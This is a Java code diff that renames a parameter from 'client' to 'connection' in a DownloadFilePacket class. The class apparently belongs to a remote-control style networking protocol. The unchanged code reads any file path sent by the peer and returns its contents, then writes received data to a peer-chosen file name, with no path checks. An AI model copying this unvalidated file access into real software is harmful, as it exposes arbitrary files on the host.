@@ -25,36 +25,36 @@ public final class DownloadFilePacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void sendRequest(final ActiveConnection client) {
-		client.writeUTF(path);
+	protected void sendRequest(final ActiveConnection connection) {
+		connection.writeUTF(path);
 	}
 	
 	@Override
-	protected void sendData(final ActiveConnection client) {
-		client.writeInt(data.length);
-		client.write(data);
-		client.writeUTF(fileName);
+	protected void sendData(final ActiveConnection connection) {
+		connection.writeInt(data.length);
+		connection.write(data);
+		connection.writeUTF(fileName);
 	}
 	
 	@Override
-	protected void receiveRequest(final ActiveConnection client) {
-		path = client.readUTF();
+	protected void receiveRequest(final ActiveConnection connection) {
+		path = connection.readUTF();
 	}
 	
 	@Override
-	protected void receiveData(final ActiveConnection client) {
-		final int length = client.readInt();
+	protected void receiveData(final ActiveConnection connection) {
+		final int length = connection.readInt();
 		
 		data = new byte[length];
 		
-		client.read(data);
+		connection.read(data);
 		
-		fileName = client.readUTF();
+		fileName = connection.readUTF();
 		
 	}
 	
 	@Override
-	protected void executeRequest(final ActiveConnection client) {
+	protected void executeRequest(final ActiveConnection connection) {
 		final File file = new File(path);
 		
 		if (file.exists() && !file.isDirectory()) {
@@ -62,12 +62,12 @@ public final class DownloadFilePacket extends AbstractPingPongPacket {
 			data = FileUtils.readExternalData(path);
 			type = DATA;
 			
-			client.addPacket(this);
+			connection.addPacket(this);
 		}
 	}
 	
 	@Override
-	protected void executeData(final ActiveConnection client) {
+	protected void executeData(final ActiveConnection connection) {
 		FileUtils.writeData(fileName, data);
 	}
 	
